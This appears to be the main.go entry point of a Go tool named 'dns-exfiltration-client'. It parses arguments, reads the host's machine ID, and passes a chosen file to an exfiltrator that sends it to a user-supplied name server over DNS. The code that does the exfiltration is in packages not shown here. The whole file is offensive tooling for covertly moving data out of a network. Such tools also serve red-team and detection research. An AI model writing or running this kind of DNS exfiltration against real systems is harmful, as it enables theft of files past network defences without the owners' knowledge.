package main

import (
	"dns-exfiltration-client/exfiltrator"
	"dns-exfiltration-client/parser"
	"log"

	"github.com/denisbrodbeck/machineid"
)

func main() {
	args := parser.ParseArgs()
	machineId, err := machineid.ID()
	if err != nil {
		log.Fatalln(err)
	}
	dnsExfiltrator := exfiltrator.NewDnsExfiltrator(args.NameServer, machineId)
	dnsExfiltrator.ExfiltrateFile(args.Filename)
}
